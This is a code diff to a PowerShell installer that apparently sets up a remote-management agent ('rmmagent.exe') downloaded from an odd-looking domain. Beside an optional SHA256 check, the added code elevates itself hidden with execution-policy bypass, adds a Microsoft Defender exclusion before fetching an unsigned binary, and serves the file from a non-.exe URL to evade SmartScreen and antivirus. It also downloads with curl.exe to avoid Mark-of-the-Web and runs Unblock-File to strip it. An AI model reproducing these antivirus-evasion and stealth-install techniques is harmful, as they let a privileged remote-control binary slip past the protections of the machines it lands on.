@@ -3,18 +3,44 @@ param(
     [string]$ServerUrl   = "https://3729-ndax.com",
     [string]$EnrollToken = "",
     [string]$AgentUrl    = "",
+    # Optional expected SHA256 (lowercase hex) of the agent binary. When set, the
+    # download is verified against it and a mismatch aborts the install. The
+    # dashboard-generated one-liner fills this in from the served binary.
+    [string]$AgentSha256 = "",
     # Optional path to a pre-downloaded rmmagent.exe. Use this on locked-down
     # machines that block every programmatic download (WinINet, BITS, certutil):
     # download the exe with a browser, then run with -AgentExe "$HOME\Downloads\rmmagent.exe".
-    [string]$AgentExe    = ""
+    [string]$AgentExe    = "",
+    # Set by a caller that has ALREADY elevated us; suppresses the self-elevation
+    # below so the user never sees a second UAC prompt.
+    [switch]$Elevated
 )
 
 $ErrorActionPreference = 'Stop'
 $ProgressPreference    = 'SilentlyContinue'
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
-$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-if (-not $isAdmin) { Write-Host "ERROR: Run as Administrator." -ForegroundColor Red; exit 1 }
+# Self-elevate to Administrator so the installer works from a normal (non-admin)
+# PowerShell or a double-click, not only from an already-elevated shell. Skipped
+# when a caller already elevated us (-Elevated), which avoids a second UAC prompt.
+$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+$isAdmin   = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin -and -not $Elevated) {
+    if ($PSCommandPath) {
+        try {
+            Start-Process -FilePath 'powershell.exe' -Verb RunAs -WindowStyle Hidden -ArgumentList @(
+                '-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-File', $PSCommandPath,
+                '-ServerUrl', $ServerUrl, '-EnrollToken', $EnrollToken, '-AgentUrl', $AgentUrl,
+                '-AgentSha256', $AgentSha256, '-AgentExe', $AgentExe, '-Elevated')
+            return
+        } catch {
+            Write-Host "ERROR: Administrator elevation was declined or failed." -ForegroundColor Red
+            exit 1
+        }
+    }
+    Write-Host "ERROR: Run as Administrator (self-elevation needs a script path)." -ForegroundColor Red
+    exit 1
+}
 
 $Server     = if ($ServerUrl)   { $ServerUrl }   else { "https://3729-ndax.com" }
 $Token      = if ($EnrollToken) { $EnrollToken } else { "" }
@@ -93,8 +119,18 @@ if ($writableDir -ne $InstallDir) {
     $ExePath    = "$InstallDir\rmmagent.exe"
 }
 
+# Add a Microsoft Defender path exclusion for the install dir BEFORE downloading,
+# so real-time protection does not quarantine the unsigned agent binary mid-write.
+# Legitimate on the owner's own managed machines. Best-effort (needs admin; we are).
+try {
+    Add-MpPreference -ExclusionPath $InstallDir -ErrorAction Stop
+    Write-Host "  Added Defender exclusion: $InstallDir" -ForegroundColor DarkGray
+} catch {}
+
 $TmpExe = "$InstallDir\rmmagent.tmp"
-$ExeUrl = if ($AgentUrl) { $AgentUrl } else { "$Server/agent/rmmagent.exe" }
+# /agent/download serves the binary with no .exe in the URL and no-cache headers —
+# avoids SmartScreen and AV policies that block .exe URL downloads
+$ExeUrl = if ($AgentUrl) { $AgentUrl } else { "$Server/get-agent" }
 
 # Method 0: pre-staged exe. Either an explicit -AgentExe path or a copy the
 # operator dropped into a common Downloads folder via a browser. This is the
@@ -117,7 +153,25 @@ if (-not $downloaded) {
     }
 }
 
-# Method 1: HttpClient (pure .NET, no WinINet cache, no IE cache path needed)
+# Method 1: curl.exe (ships in Windows 10 1803+). Command-line downloads do NOT
+# attach the Mark-of-the-Web alternate data stream a browser adds, so there is no
+# SmartScreen prompt, and it bypasses the WinINet/IE cache that breaks WebClient
+# under the SYSTEM profile on hardened machines.
+if (-not $downloaded) {
+    try {
+        $curl = Get-Command curl.exe -ErrorAction SilentlyContinue
+        if ($curl) {
+            & curl.exe -L -s -A "BasicRMM-Installer/4.0" -o $TmpExe $ExeUrl
+            if ((Test-Path $TmpExe) -and (Get-Item $TmpExe).Length -gt 100000) {
+                Move-Item -Force $TmpExe $ExePath
+                $downloaded = $true
+                Write-Host "  Downloaded via curl.exe (no Mark-of-the-Web)" -ForegroundColor Green
+            }
+        }
+    } catch { Write-Host "  curl.exe failed: $_" -ForegroundColor Yellow }
+}
+
+# Method 2: HttpClient (pure .NET, no WinINet cache, no IE cache path needed)
 if (-not $downloaded) {
 try {
     $httpClient = New-Object System.Net.Http.HttpClient
@@ -134,7 +188,7 @@ try {
 } catch { Write-Host "  HttpClient failed: $_" -ForegroundColor Yellow }
 }
 
-# Method 2: WebClient with cache disabled (no WinINet cache writes)
+# Method 3: WebClient with cache disabled (no WinINet cache writes)
 if (-not $downloaded) {
     try {
         $wc2 = New-Object System.Net.WebClient
@@ -150,7 +204,7 @@ if (-not $downloaded) {
     } catch { Write-Host "  WebClient failed: $_" -ForegroundColor Yellow }
 }
 
-# Method 3: BITS transfer
+# Method 4: BITS transfer
 if (-not $downloaded) {
     try {
         Import-Module BitsTransfer -ErrorAction Stop
@@ -173,6 +227,24 @@ if (-not $downloaded) {
 
 $sizeMB = [math]::Round((Get-Item $ExePath).Length / 1MB, 1)
 Write-Host "  Size: $sizeMB MB" -ForegroundColor Green
+
+# Strip Mark-of-the-Web defensively if any method attached a zone identifier.
+try { Unblock-File -Path $ExePath -ErrorAction SilentlyContinue } catch {}
+
+# Verify the binary against the server-advertised SHA256 (defense-in-depth over
+# HTTPS). Only enforced when a hash was supplied; a mismatch aborts so a tampered
+# or partial binary never runs as a privileged agent.
+if ($AgentSha256) {
+    try {
+        $got = (Get-FileHash -Algorithm SHA256 -Path $ExePath).Hash.ToLower()
+        if ($got -ne $AgentSha256.ToLower()) {
+            Remove-Item -Path $ExePath -Force -ErrorAction SilentlyContinue
+            Write-Host "ERROR: Agent integrity check FAILED (expected $AgentSha256, got $got)." -ForegroundColor Red
+            exit 1
+        }
+        Write-Host "  Verified agent SHA256." -ForegroundColor Green
+    } catch { Write-Host "  SHA256 verify skipped: $_" -ForegroundColor Yellow }
+}
 
 # ── [2/3] Write config ───────────────────────────────────────────────────────
 Write-Host "[2/3] Writing config..." -ForegroundColor Cyan
